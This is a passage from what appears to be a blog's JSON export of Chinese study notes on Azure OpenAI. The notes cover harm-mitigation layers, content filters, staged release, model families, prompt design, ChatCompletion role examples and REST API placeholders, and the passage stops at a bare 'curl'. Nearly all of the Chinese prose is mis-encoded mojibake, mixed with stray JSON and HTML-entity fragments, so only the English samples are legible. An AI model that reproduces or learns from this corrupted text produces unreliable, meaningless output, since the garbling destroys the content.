ä½¿ç”¨è‡ªå·±çš„è®­ç»ƒæ•°æ®å¾®è°ƒåŸºç¡€æ¨¡å‹ï¼Œä½¿å…¶ç”Ÿæˆçš„å“åº”æ›´æœ‰å¯èƒ½ä¸ä½ çš„è§£å†³æ–¹æ¡ˆåœºæ™¯ç›¸å…³å¹¶å¥‘åˆå®ƒçš„èŒƒå›´ã€‚ 2ï¼šå®‰å…¨ç³»ç»Ÿå±‚çº§å®‰å…¨ç³»ç»Ÿå±‚çº§åŒ…æ‹¬å¹³å°çº§é…ç½®å’ŒåŠŸèƒ½ï¼Œå¯å¸®åŠ©ç¼“è§£å±å®³ã€‚ ä¾‹å¦‚ï¼ŒAzure OpenAI æœåŠ¡åŒ…æ‹¬å¯¹å†…å®¹ç­›é€‰å™¨çš„æ”¯æŒï¼Œè¿™äº›å†…å®¹ç­›é€‰å™¨åº”ç”¨æ ‡å‡†ï¼Œæ ¹æ®å°†å››ä¸ªæ½œåœ¨å±å®³ç±»åˆ«ï¼ˆä»‡æ¨ã€æ€§ã€æš´åŠ›å’Œè‡ªæ®‹ï¼‰çš„å†…å®¹åˆ†ç±»ä¸ºå››ä¸ªä¸¥é‡æ€§çº§åˆ«ï¼ˆå®‰å…¨ã€ä½ã€ä¸­å’Œé«˜ï¼‰æ¥ç¦æ­¢æ˜¾ç¤ºæç¤ºå’Œå“åº”ã€‚ å…¶ä»–å®‰å…¨ç³»ç»Ÿå±‚çº§ç¼“è§£æªæ–½å¯èƒ½åŒ…æ‹¬æ»¥ç”¨æ£€æµ‹ç®—æ³•å’Œè­¦æŠ¥é€šçŸ¥ï¼Œå‰è€…ç”¨äºç¡®å®šè§£å†³æ–¹æ¡ˆæ˜¯å¦è¢«ç³»ç»Ÿæ€§æ»¥ç”¨ï¼ˆä¾‹å¦‚é€šè¿‡æ¥è‡ªæœºå™¨äººçš„å¤§é‡è‡ªåŠ¨è¯·æ±‚ï¼‰ï¼Œåè€…ç”¨äºå¿«é€Ÿå“åº”æ½œåœ¨çš„ç³»ç»Ÿæ»¥ç”¨æˆ–æœ‰å®³è¡Œä¸ºã€‚ 3ï¼šå…ƒæç¤ºå’Œæ¥åœ°å±‚å…ƒæç¤ºå’Œæ¥åœ°å±‚ä¾§é‡äºæäº¤åˆ°æ¨¡å‹çš„æç¤ºçš„æ„é€ ã€‚ å¯åœ¨æ­¤å±‚åº”ç”¨çš„å±å®³ç¼“è§£æŠ€æœ¯åŒ…æ‹¬ï¼š æŒ‡å®šä¸ºæ¨¡å‹å®šä¹‰è¡Œä¸ºå‚æ•°çš„å…ƒæç¤ºæˆ–ç³»ç»Ÿè¾“å…¥ã€‚ åº”ç”¨æç¤ºå·¥ç¨‹å°†æ¥åœ°æ•°æ®æ·»åŠ åˆ°è¾“å…¥æç¤ºï¼Œæœ€å¤§é™åº¦åœ°æé«˜ç›¸å…³ã€æ— å®³è¾“å‡ºçš„å¯èƒ½æ€§ã€‚ ä½¿ç”¨æ£€ç´¢å¢å¼ºç”Ÿæˆ (RAG) æ–¹æ³•ä»å—ä¿¡ä»»çš„æ•°æ®æºæ£€ç´¢ä¸Šä¸‹æ–‡æ•°æ®å¹¶å°†å…¶åŒ…å«åœ¨æç¤ºä¸­ã€‚ 4ï¼šç”¨æˆ·ä½“éªŒå±‚ç”¨æˆ·ä½“éªŒå±‚åŒ…æ‹¬è½¯ä»¶åº”ç”¨ç¨‹åºï¼ˆç”¨æˆ·é€šè¿‡è½¯ä»¶åº”ç”¨ç¨‹åºä¸ç”Ÿæˆå¼ AI æ¨¡å‹è¿›è¡Œäº¤äº’ï¼‰ä»¥åŠå‘ç”¨æˆ·å’Œåˆ©ç›Šå¹²ç³»äººæè¿°è§£å†³æ–¹æ¡ˆä½¿ç”¨çš„æ–‡æ¡£æˆ–å…¶ä»–ç”¨æˆ·èµ„æ–™ã€‚ è®¾è®¡åº”ç”¨ç¨‹åºç”¨æˆ·ç•Œé¢ä»¥å°†è¾“å…¥é™åˆ¶ä¸ºç‰¹å®šä¸»é¢˜æˆ–ç±»å‹ï¼Œæˆ–è€…åº”ç”¨è¾“å…¥å’Œè¾“å‡ºéªŒè¯å¯ä»¥é™ä½æ½œåœ¨æœ‰å®³å“åº”çš„é£é™©ã€‚ ç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆçš„æ–‡æ¡£å’Œå…¶ä»–è¯´æ˜åº”é€‚å½“é€æ˜åœ°è¯´æ˜ç³»ç»Ÿçš„åŠŸèƒ½å’Œé™åˆ¶ã€å…¶æ‰€åŸºäºçš„æ¨¡å‹ä»¥åŠä½ å·²å®æ–½çš„ç¼“è§£æªæ–½å¯èƒ½æ— æ³•å§‹ç»ˆè§£å†³çš„ä»»ä½•æ½œåœ¨å±å®³ã€‚ è¿è¥è´Ÿè´£ä»»çš„ç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆè¯†åˆ«æ½œåœ¨å±å®³ã€å¼€å‘ä¸€ç§æ–¹æ³•æ¥è¡¡é‡å…¶å­˜åœ¨æƒ…å†µå¹¶åœ¨è§£å†³æ–¹æ¡ˆä¸­å®æ–½ç¼“è§£æªæ–½åï¼Œå°±å¯ä»¥å‡†å¤‡å¥½å‘å¸ƒè§£å†³æ–¹æ¡ˆäº†ã€‚ åœ¨å‘å¸ƒä¹‹å‰ï¼Œéœ€è¦è€ƒè™‘ä¸€äº›æ³¨æ„äº‹é¡¹ï¼Œä»¥å¸®åŠ©ä½ ç¡®ä¿å‘å¸ƒå’Œåç»­è¿è¥æˆåŠŸã€‚ å®Œæˆå‘å¸ƒå‰è¯„å®¡åœ¨å‘å¸ƒç”Ÿæˆå¼ AI è§£å†³æ–¹æ¡ˆä¹‹å‰ï¼Œè¯·ç¡®å®šç»„ç»‡å’Œè¡Œä¸šçš„å„ç§åˆè§„æ€§è¦æ±‚ï¼Œå¹¶ç¡®ä¿ç›¸åº”çš„å›¢é˜Ÿæœ‰æœºä¼šæŸ¥çœ‹ç³»ç»ŸåŠå…¶æ–‡æ¡£ã€‚ å¸¸è§çš„åˆè§„æ€§è¯„å®¡åŒ…æ‹¬ï¼š Legal éšç§ å®‰å…¨æ€§ è¾…åŠ©åŠŸèƒ½ å‘å¸ƒå’Œè¿è¥è§£å†³æ–¹æ¡ˆæˆåŠŸçš„å‘å¸ƒéœ€è¦ä¸€äº›è§„åˆ’å’Œå‡†å¤‡ã€‚ éµå¾ªä»¥ä¸‹æŒ‡å—ï¼š è®¾è®¡åˆ†é˜¶æ®µäº¤ä»˜è®¡åˆ’ï¼Œé¦–å…ˆå°†è§£å†³æ–¹æ¡ˆå‘å¸ƒç»™ä¸€ç»„æœ‰é™çš„ç”¨æˆ·ã€‚ é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œä½ å¯ä»¥åœ¨å‘æ›´å¹¿æ³›çš„å—ä¼—å‘å¸ƒä¹‹å‰æ”¶é›†åé¦ˆå¹¶è¯†åˆ«é—®é¢˜ã€‚ åˆ›å»ºäº‹ä»¶å“åº”è®¡åˆ’ï¼Œå…¶ä¸­åŒ…æ‹¬å“åº”æ„å¤–äº‹ä»¶æ‰€èŠ±è´¹çš„ä¼°è®¡æ—¶é—´ã€‚ åˆ›å»ºå›æ»šè®¡åˆ’ï¼Œå®šä¹‰åœ¨å‘ç”Ÿäº‹ä»¶æ—¶å°†è§£å†³æ–¹æ¡ˆè¿˜åŸåˆ°å…ˆå‰çŠ¶æ€çš„æ­¥éª¤ã€‚ å®ç°åœ¨å‘ç°æœ‰å®³ç³»ç»Ÿå“åº”æ—¶ç«‹å³é˜»æ­¢è¿™äº›å“åº”çš„åŠŸèƒ½ã€‚ å®ç°åœ¨å‘ç”Ÿç³»ç»Ÿæ»¥ç”¨æ—¶é˜»æ­¢ç‰¹å®šç”¨æˆ·ã€åº”ç”¨ç¨‹åºæˆ–å®¢æˆ·ç«¯ IP åœ°å€çš„åŠŸèƒ½ã€‚ å®ç°ä¸€ç§è®©ç”¨æˆ·æä¾›åé¦ˆå’ŒæŠ¥å‘Šé—®é¢˜çš„æ–¹æ³•ã€‚ ç‰¹åˆ«æ˜¯ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿå°†ç”Ÿæˆçš„å†…å®¹æŠ¥å‘Šä¸ºâ€œä¸å‡†ç¡®â€ã€â€œä¸å®Œæ•´â€ã€â€œæœ‰å®³â€ã€â€œæ”»å‡»æ€§â€æˆ–å…¶ä»–é—®é¢˜ã€‚ è·Ÿè¸ªé¥æµ‹æ•°æ®ï¼Œä½¿ä½ èƒ½å¤Ÿç¡®å®šç”¨æˆ·æ»¡æ„åº¦å¹¶ç¡®å®šåŠŸèƒ½å·®è·æˆ–å¯ç”¨æ€§æŒ‘æˆ˜ã€‚ æ”¶é›†çš„é¥æµ‹æ•°æ®åº”ç¬¦åˆéšç§æ³•ä»¥åŠä½ è‡ªå·±ç»„ç»‡çš„ç­–ç•¥å’Œå¯¹ç”¨æˆ·éšç§çš„æ‰¿è¯ºã€‚ https://microsoftlearning.github.io/mslearn-ai-fundamentals/Instructions/Labs/14-azure-openai-content-filters.html#before-you-start å†…å®¹ç­›é€‰å™¨ä½¿ä½ èƒ½å¤Ÿåœ¨å®‰å…¨ç³»ç»Ÿå±‚çº§ç¦æ­¢æ˜¾ç¤ºæœ‰å®³å†…å®¹ã€‚AI å½±å“è¯„ä¼°æŒ‡å—è®°å½•äº†ç³»ç»Ÿçš„é¢„æœŸä½¿ç”¨æƒ…å†µï¼Œå¹¶å¸®åŠ©è¯†åˆ«æ½œåœ¨çš„å±å®³ã€‚é€šè¿‡å‘æœ‰é™çš„ç”¨æˆ·ç¾¤å‘å¸ƒåˆå§‹ç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨å¹¿æ³›å‘å¸ƒä¹‹å‰æ”¶é›†åé¦ˆå¹¶è¯†åˆ«é—®é¢˜ï¼Œä»è€Œæœ€å¤§ç¨‹åº¦åœ°å‡å°‘å±å®³ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":"Azure OpenAI Natural Language","slug":"Azure-openai","date":"2024-06-04T15:02:14.000Z","updated":"2024-08-29T14:23:46.000Z","comments":true,"path":"2024/06/04/Azure-openai/","permalink":"https://banjinmei.github.io/2024/06/04/Azure-openai/","excerpt":"","text":"ç®€ä»‹Azure OpenAI ä¸ºå¼€å‘äººå‘˜æä¾›äº†ä¸€ä¸ªå¹³å°ï¼Œç”¨äºåœ¨ Python å’Œ C# SDK ä»¥åŠ REST API çš„å¸®åŠ©ä¸‹å‘å…¶åº”ç”¨ç¨‹åºæ·»åŠ äººå·¥æ™ºèƒ½åŠŸèƒ½ã€‚ è¯¥å¹³å°æä¾›äº†å„ç§ AI æ¨¡å‹ï¼Œæ¯ä¸ªæ¨¡å‹éƒ½ä¸“ç”¨äºä¸åŒçš„ä»»åŠ¡ï¼Œè¿™äº›ä»»åŠ¡å¯é€šè¿‡ Azure OpenAI æœåŠ¡è¿›è¡Œéƒ¨ç½²ã€‚ æœ¬æ¨¡å—æŒ‡å¯¼ä½ äº†è§£å¦‚ä½•å°† Azure OpenAI æ„å»ºåˆ°è‡ªå·±çš„åº”ç”¨ç¨‹åºä¸­ï¼Œä¸ºä½ æä¾›ä¸€ä¸ªä½¿ç”¨ç”Ÿæˆå¼ AI å¼€å‘è§£å†³æ–¹æ¡ˆçš„èµ·ç‚¹ã€‚ å°† Azure OpenAI é›†æˆåˆ°åº”ç”¨ä¸­Azure OpenAI æä¾› C# å’Œ Python SDK ä»¥åŠ REST APIï¼Œå¼€å‘äººå‘˜å¯ä»¥ç”¨æ¥å‘å…¶åº”ç”¨ç¨‹åºæ·»åŠ  AI åŠŸèƒ½ã€‚ Azure OpenAI ä¸­çš„ç”Ÿæˆå¼ AI åŠŸèƒ½é€šè¿‡æ¨¡å‹æä¾›ã€‚ Azure OpenAI æœåŠ¡ä¸­å¯ç”¨çš„æ¨¡å‹å±äºä¸åŒçš„ç³»åˆ—ï¼Œæ¯ä¸ªç³»åˆ—éƒ½æœ‰è‡ªå·±çš„é‡ç‚¹ã€‚ è‹¥è¦ä½¿ç”¨è¿™äº›æ¨¡å‹ä¹‹ä¸€ï¼Œéœ€è¦é€šè¿‡ Azure OpenAI æœåŠ¡è¿›è¡Œéƒ¨ç½²ã€‚ é‡è¦ Azure OpenAI å·²å‘å¸ƒï¼Œä½†æ”¯æŒè´Ÿè´£ä»»åœ°ä½¿ç”¨è¯¥æœåŠ¡çš„è®¿é—®æƒé™æœ‰é™ã€‚ ç”¨æˆ·éœ€è¦å…ˆç”³è¯·è®¿é—®æƒé™å¹¶è·å¾—æ‰¹å‡†ï¼Œç„¶åæ‰èƒ½åˆ›å»º Azure OpenAI èµ„æºã€‚ åˆ›å»º Azure OpenAI èµ„æºå¯ä»¥é€šè¿‡ Azure å‘½ä»¤è¡Œæ¥å£ (CLI) å’Œ Azure é—¨æˆ·éƒ¨ç½² Azure OpenAI èµ„æºã€‚ é€šè¿‡ Azure é—¨æˆ·åˆ›å»º Azure OpenAI èµ„æºç±»ä¼¼äºéƒ¨ç½²å•ä¸ª Azure AI æœåŠ¡èµ„æºï¼Œå¹¶ä¸”æ˜¯ Azure AI æœåŠ¡çš„ä¸€éƒ¨åˆ†ã€‚ å¯¼èˆªåˆ° Azure é—¨æˆ· æœç´¢ Azure OpenAIï¼Œå°†å…¶é€‰ä¸­ï¼Œç„¶åå•å‡»â€œåˆ›å»ºâ€ ä¸ºç©ºå­—æ®µè¾“å…¥é€‚å½“çš„å€¼ï¼Œç„¶ååˆ›å»ºèµ„æºã€‚ ç›®å‰ Azure OpenAI å¯èƒ½éƒ¨ç½²çš„åŒºåŸŸæœ‰é™ã€‚ é€‰æ‹©è·ç¦»æ‰€åœ¨ç‰©ç†ä½ç½®æœ€è¿‘çš„åŒºåŸŸã€‚ åˆ›å»ºèµ„æºåï¼Œä½ å°†è·å¾—å¯åœ¨åº”ç”¨ä¸­ä½¿ç”¨çš„å¯†é’¥å’Œç»ˆç»“ç‚¹ã€‚ é€‰æ‹©å’Œéƒ¨ç½²æ¨¡å‹æ¯ä¸ªæ¨¡å‹ç³»åˆ—æ“…é•¿ä¸åŒçš„ä»»åŠ¡ï¼Œå¹¶ä¸”æ¯ä¸ªç³»åˆ—ä¸­æ¨¡å‹å…·æœ‰ä¸åŒçš„åŠŸèƒ½ã€‚ æ¨¡å‹ç³»åˆ—åˆ†ä¸ºä¸‰ä¸ªä¸»è¦ç³»åˆ—ï¼š ç”Ÿæˆå¼é¢„è®­ç»ƒè½¬æ¢å™¨ (GPT) - èƒ½å¤Ÿç†è§£å’Œç”Ÿæˆè‡ªç„¶è¯­è¨€å’ŒæŸäº›ä»£ç çš„æ¨¡å‹ã€‚ è¿™äº›æ¨¡å‹æœ€é€‚åˆå¸¸è§„ä»»åŠ¡ã€å¯¹è¯å’ŒèŠå¤©æ ¼å¼ã€‚ ä»£ç ï¼ˆgpt-3 åŠæ›´æ—©ç‰ˆæœ¬ï¼‰ - ä»£ç æ¨¡å‹åŸºäº GPT æ¨¡å‹æ„å»ºï¼Œå¹¶é€šè¿‡æ•°ç™¾ä¸‡è¡Œä»£ç è¿›è¡Œè®­ç»ƒã€‚ è¿™äº›æ¨¡å‹å¯ä»¥ç†è§£å’Œç”Ÿæˆä»£ç ï¼ŒåŒ…æ‹¬è§£é‡Šæ³¨é‡Šæˆ–è‡ªç„¶è¯­è¨€ä»¥ç”Ÿæˆä»£ç ã€‚ gpt-35-turbo å’Œæ›´é«˜ç‰ˆæœ¬çš„æ¨¡å‹åŒ…å«æ­¤ä»£ç åŠŸèƒ½ï¼Œè€Œæ— éœ€å•ç‹¬çš„ä»£ç æ¨¡å‹ã€‚ åµŒå…¥ - è¿™äº›æ¨¡å‹å¯ä»¥ç†è§£å’Œä½¿ç”¨åµŒå…¥ï¼Œè¿™æ˜¯æœºå™¨å­¦ä¹ æ¨¡å‹å’Œç®—æ³•å¯ä»¥ä½¿ç”¨çš„ç‰¹æ®Šæ•°æ®æ ¼å¼ã€‚ æœ¬æ¨¡å—é‡ç‚¹ä»‹ç»å¸¸è§„ GPT æ¨¡å‹ï¼Œå…¶ä»–æ¨¡å—å°†ä»‹ç»å…¶ä»–æ¨¡å‹ã€‚ å¯¹äºè¾ƒæ—§çš„æ¨¡å‹ï¼Œæ¨¡å‹ç³»åˆ—å’ŒåŠŸèƒ½ä¼šåœ¨åŸºç¡€æ¨¡å‹çš„åç§°ä¸­æœ‰æ‰€ä½“ç°ï¼šå¦‚ text-davinci-003ï¼Œè¯¥åç§°æŒ‡å®šå®ƒæ˜¯ä¸€ä¸ªæ–‡æœ¬æ¨¡å‹ï¼Œå…·æœ‰ davinci çº§åˆ«çš„åŠŸèƒ½ï¼Œå¹¶å¸¦æœ‰æ ‡è¯†ç¬¦ 3ã€‚ æœ‰å…³æ¨¡å‹ã€åŠŸèƒ½çº§åˆ«å’Œå‘½åçº¦å®šçš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Azure OpenAI æ¨¡å‹æ–‡æ¡£é¡µã€‚ è¾ƒæ–°çš„æ¨¡å‹ä¼šæŒ‡å®šç¬¬å‡ ä»£ gptï¼Œä»¥åŠå®ƒä»¬æ˜¯å¦ä¸º turbo ç‰ˆæœ¬ï¼Œä¾‹å¦‚ gpt-35-turbo è¡¨ç¤º GPT 3.5 Turbo æ¨¡å‹ã€‚ è‹¥è¦éƒ¨ç½²æ¨¡å‹ä¾›ä½ ä½¿ç”¨ï¼Œè¯·å¯¼èˆªåˆ° Azure OpenAI Studio å¹¶è½¬åˆ°â€œéƒ¨ç½²â€é¡µã€‚ æœ¬æ¨¡å—åé¢çš„å®éªŒå®¤è¯¦ç»†ä»‹ç»äº†å¦‚ä½•æ‰§è¡Œæ­¤æ“ä½œã€‚ å·²éƒ¨ç½²æ¨¡å‹çš„èº«ä»½éªŒè¯å’Œè§„èŒƒåœ¨ Azure OpenAI ä¸­éƒ¨ç½²æ¨¡å‹æ—¶ï¼Œé€‰æ‹©ä¸€ä¸ªéƒ¨ç½²åç§°æ¥æŒ‡å®šå®ƒã€‚ é…ç½®åº”ç”¨æ—¶ï¼Œéœ€è¦æŒ‡å®šèµ„æºç»ˆç»“ç‚¹ã€å¯†é’¥å’Œéƒ¨ç½²åç§°ï¼Œä»¥æŒ‡å®šè¦å‘å…¶å‘é€è¯·æ±‚çš„éƒ¨ç½²æ¨¡å‹ã€‚ è¿™ä½¿ä½ èƒ½å¤Ÿåœ¨åŒä¸€èµ„æºä¸­éƒ¨ç½²å„ç§æ¨¡å‹ï¼Œå¹¶æ ¹æ®ä»»åŠ¡å‘ç›¸åº”çš„æ¨¡å‹å‘å‡ºè¯·æ±‚ã€‚ æç¤ºè®¾è®¡è¾“å…¥æç¤ºçš„å†™å…¥æ–¹å¼åœ¨ AI æ¨¡å‹çš„å“åº”æ–¹å¼ä¸­èµ·ç€å¾ˆå¤§çš„ä½œç”¨ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœå‡ºç°ç®€å•è¯·æ±‚ï¼ˆå¦‚â€œä»€ä¹ˆæ˜¯ Azure OpenAIâ€ï¼‰çš„æç¤ºï¼Œé€šå¸¸ä¼šè·å¾—ç±»ä¼¼äºä½¿ç”¨æœç´¢å¼•æ“çš„é€šç”¨ç­”æ¡ˆã€‚ ä½†æ˜¯ï¼Œå¦‚æœåœ¨ä½ çš„ç­”å¤ä¸­æä¾›æœ‰å…³æ‰€éœ€å†…å®¹çš„è¯¦ç»†ä¿¡æ¯ï¼Œåˆ™ä¼šè·å¾—æ›´å…·ä½“çš„ç­”æ¡ˆã€‚ ä¾‹å¦‚ï¼Œå‡å®šå‡ºç°ä»¥ä¸‹æç¤ºï¼š 1234567Classify the following news headline into 1 of the following categories: Business, Tech, Politics, Sport, EntertainmentHeadline 1: Donna Steffensen Is Cooking Up a New Kind of Perfection. The Internetâ€™s most beloved cooking guru has a buzzy new book and a fresh new perspectiveCategory: EntertainmentHeadline 2: Major Retailer Announces Plans to Close Over 100 StoresCategory: ä½ å¯èƒ½ä¼šåœ¨æ ‡é¢˜ä¸‹çœ‹åˆ°â€œç±»åˆ«:â€ï¼Œå…¶ä¸­å¡«å†™äº†â€œä¸šåŠ¡â€ã€‚ å¯ä»¥åœ¨ Azure OpenAI Studio Playground ä¸­çš„â€œç¤ºä¾‹â€ä¸‹æ‹‰åˆ—è¡¨ä¸­æ‰¾åˆ°ä¸æ­¤ç±»ä¼¼çš„å‡ ä¸ªç¤ºä¾‹ã€‚ å°½å¯èƒ½è¯¦ç»†æè¿°æ¥è‡ªæ¨¡å‹çš„å“åº”ä¸­æ‰€éœ€çš„å†…å®¹ï¼Œä½ å¯èƒ½ä¼šæƒŠè®¶äºå®ƒæ˜¯å¤šä¹ˆæœ‰è§åœ°ï¼ æ³¨æ„ æ— æ³•å¤§èƒ†åœ°å‡è®¾æ¥è‡ª AI æ¨¡å‹çš„ç­”æ¡ˆæ˜¯äº‹å®æˆ–æ­£ç¡®ã€‚ è´Ÿè´£å¼€å‘å’Œéƒ¨ç½² AI ç³»ç»Ÿçš„å›¢é˜Ÿæˆ–ä¸ªäººåº”åŠªåŠ›è¯†åˆ«ã€è¡¡é‡å’Œå‡è½»å±å®³ã€‚ ä½ æœ‰è´£ä»»éªŒè¯æ¥è‡ª AI æ¨¡å‹çš„ä»»ä½•å“åº”ï¼Œå¹¶è´Ÿè´£ä»»åœ°ä½¿ç”¨ AIã€‚ æœ‰å…³å¦‚ä½•è´Ÿè´£ä»»åœ°ä½¿ç”¨ Azure OpenAI æ¨¡å‹çš„è¿›ä¸€æ­¥æŒ‡å—ï¼Œè¯·æŸ¥çœ‹ Microsoft å…³äº Azure OpenAI çš„é€æ˜åº¦è¯´æ˜ã€‚ å¯åœ¨æç¤ºå·¥ç¨‹æ–‡æ¡£é¡µä¸­æ‰¾åˆ°æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚ å¯ç”¨çš„ç»ˆç»“ç‚¹å¯ä»¥é€šè¿‡ REST API æˆ–å½“å‰å¯ç”¨äº Python å’Œ C# çš„ SDK è®¿é—® Azure OpenAIã€‚ å¯ç”¨äºä¸å·²éƒ¨ç½²æ¨¡å‹äº¤äº’çš„ç»ˆç»“ç‚¹çš„ä½¿ç”¨æ–¹å¼ä¸åŒï¼Œå¹¶ä¸”æŸäº›ç»ˆç»“ç‚¹åªèƒ½ä½¿ç”¨æŸäº›æ¨¡å‹ã€‚ å¯ç”¨çš„ç»ˆç»“ç‚¹åŒ…æ‹¬ï¼š å®Œæˆ - æ¨¡å‹æ¥å—ä¸€ä¸ªè¾“å…¥æç¤ºï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ªé¢„æµ‹çš„å®Œæˆã€‚ ä½ å°†åœ¨ studio ä¸­çœ‹åˆ°æ­¤æ“åœºï¼Œä½†åœ¨æœ¬æ¨¡å—ä¸­ä¸ä¼šæ·±å…¥è®¨è®ºã€‚ ChatCompletion - æ¨¡å‹æ¥å—èŠå¤©å¯¹è¯å½¢å¼çš„è¾“å…¥ï¼ˆå…¶ä¸­è§’è‰²ä½¿ç”¨ä»–ä»¬å‘é€çš„æ¶ˆæ¯æŒ‡å®šï¼‰ï¼Œç„¶åç”Ÿæˆä¸‹ä¸€ä¸ªèŠå¤©å®Œæˆã€‚ åµŒå…¥ - æ¨¡å‹æ¥å—è¾“å…¥å¹¶è¿”å›è¯¥è¾“å…¥çš„çŸ¢é‡è¡¨ç¤ºå½¢å¼ã€‚ ä¾‹å¦‚ï¼ŒChatCompletion çš„è¾“å…¥æ˜¯æ¯æ¡æ¶ˆæ¯éƒ½æœ‰æ˜ç¡®å®šä¹‰è§’è‰²çš„ä¼šè¯ï¼š 1234&#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant, teaching people about AI.&quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Does Azure OpenAI support multiple languages?&quot;&#125;,&#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;Yes, Azure OpenAI supports several languages, and can translate between them.&quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Do other Azure AI Services support translation too?&quot;&#125; å½“ä½ ä¸º AI æ¨¡å‹æä¾›ä¸€ä¸ªçœŸå®çš„å¯¹è¯æ—¶ï¼Œå®ƒå¯ä»¥ç”Ÿæˆå…·æœ‰æ›´å‡†ç¡®çš„è¯­æ°”ã€æªè¾å’Œä¸Šä¸‹æ–‡çš„æ›´å¥½å“åº”ã€‚ ChatCompletion ç»ˆç»“ç‚¹é€šè¿‡å‘é€ä¸ä¸‹ä¸€ä¸ªç”¨æˆ·æ¶ˆæ¯çš„èŠå¤©å†å²è®°å½•ï¼Œä½¿ ChatGPT æ¨¡å‹èƒ½å¤Ÿè¿›è¡Œæ›´çœŸå®çš„å¯¹è¯ã€‚ ChatCompletion è¿˜æ”¯æŒéèŠå¤©åœºæ™¯ï¼Œä¾‹å¦‚æ‘˜è¦æˆ–å®ä½“æå–ã€‚ å¯é€šè¿‡æä¾›ç®€çŸ­å¯¹è¯ã€æŒ‡å®šç³»ç»Ÿä¿¡æ¯å’Œæ‰€éœ€å†…å®¹ï¼Œå¹¶è®©ç”¨æˆ·è¾“å…¥ä¿¡æ¯æ¥å®ç°æ­¤æ“ä½œã€‚ ä¾‹å¦‚ï¼Œå¦‚æœè¦ç”Ÿæˆå·¥ä½œæè¿°ï¼Œè¯·å‘ ChatCompletion æä¾›ç±»ä¼¼äºä»¥ä¸‹å¯¹è¯è¾“å…¥çš„å†…å®¹ã€‚ 12&#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are an assistant designed to write intriguing job descriptions. &quot;&#125;,&#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Write a job description for the following job title: &#x27;Business Intelligence Analyst&#x27;. It should include responsibilities, required qualifications, and highlight benefits like time off and flexible hours.&quot;&#125; æ³¨æ„ Completion é€‚ç”¨äºæ‰€æœ‰ gpt-3 ç”Ÿæˆæ¨¡å‹ï¼Œè€Œ ChatCompletion æ˜¯ gpt-4 æ¨¡å‹å”¯ä¸€æ”¯æŒçš„é€‰é¡¹ï¼Œå¹¶ä¸”æ˜¯ä½¿ç”¨ gpt-35-turbo æ¨¡å‹æ—¶çš„é¦–é€‰ç»ˆç»“ç‚¹ã€‚ æœ¬æ¨¡å—ä¸­çš„å®éªŒå°† gpt-35-turbo ä¸ ChatCompletion ç»ˆç»“ç‚¹ç»“åˆä½¿ç”¨ã€‚ ä½¿ç”¨ Azure OpenAI REST APIAzure OpenAI æä¾›äº†ä¸€ä¸ª REST API ç”¨äºäº¤äº’å’Œç”Ÿæˆå“åº”ï¼Œå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨å®ƒå°† AI åŠŸèƒ½æ·»åŠ åˆ°å…¶åº”ç”¨ç¨‹åºã€‚ æœ¬å•å…ƒä»‹ç» API çš„ç¤ºä¾‹ç”¨æ³•ã€è¾“å…¥å’Œè¾“å‡ºã€‚ æ³¨æ„ åœ¨ä¸ API äº¤äº’ä¹‹å‰ï¼Œå¿…é¡»åœ¨ Azure é—¨æˆ·ä¸­åˆ›å»º Azure OpenAI èµ„æºï¼Œåœ¨è¯¥èµ„æºä¸­éƒ¨ç½²æ¨¡å‹ï¼Œå¹¶æ£€ç´¢ç»ˆç»“ç‚¹å’Œå¯†é’¥ã€‚ è¯·æŸ¥çœ‹ Azure OpenAI æœåŠ¡å…¥é—¨ï¼Œäº†è§£å¦‚ä½•æ‰§è¡Œæ­¤æ“ä½œã€‚ æ¯æ¬¡è°ƒç”¨ REST API æ—¶ï¼Œéƒ½éœ€è¦ Azure OpenAI èµ„æºçš„ç»ˆç»“ç‚¹å’Œå¯†é’¥ï¼Œä»¥åŠä¸ºéƒ¨ç½²çš„æ¨¡å‹æä¾›çš„åç§°ã€‚ åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨ä»¥ä¸‹å ä½ç¬¦ï¼š å ä½ç¬¦åç§° å€¼ YOUR_ENDPOINT_NAME æ­¤åŸºæœ¬ç»ˆç»“ç‚¹ä½äº Azure é—¨æˆ·çš„â€œå¯†é’¥å’Œç»ˆç»“ç‚¹â€éƒ¨åˆ†ã€‚ å®ƒæ˜¯èµ„æºçš„åŸºæœ¬ç»ˆç»“ç‚¹ï¼Œä¾‹å¦‚ https://sample.openai.azure.com/ã€‚ YOUR_API_KEY å¯†é’¥ä½äº Azure é—¨æˆ·çš„â€œå¯†é’¥å’Œç»ˆç»“ç‚¹â€éƒ¨åˆ†ã€‚ å¯ä»¥åœ¨èµ„æºä¸­ä½¿ç”¨ä»»ä¸€å¯†é’¥ã€‚ YOUR_DEPLOYMENT_NAME æ­¤éƒ¨ç½²åç§°æ˜¯åœ¨ Azure OpenAI Studio ä¸­éƒ¨ç½²æ¨¡å‹æ—¶æä¾›çš„åç§°ã€‚ èŠå¤©å®Œæˆåœ¨ Azure OpenAI èµ„æºä¸­éƒ¨ç½²æ¨¡å‹åï¼Œå¯ä»¥ä½¿ç”¨ POST è¯·æ±‚å‘æœåŠ¡å‘é€æç¤ºã€‚ 1234567curl 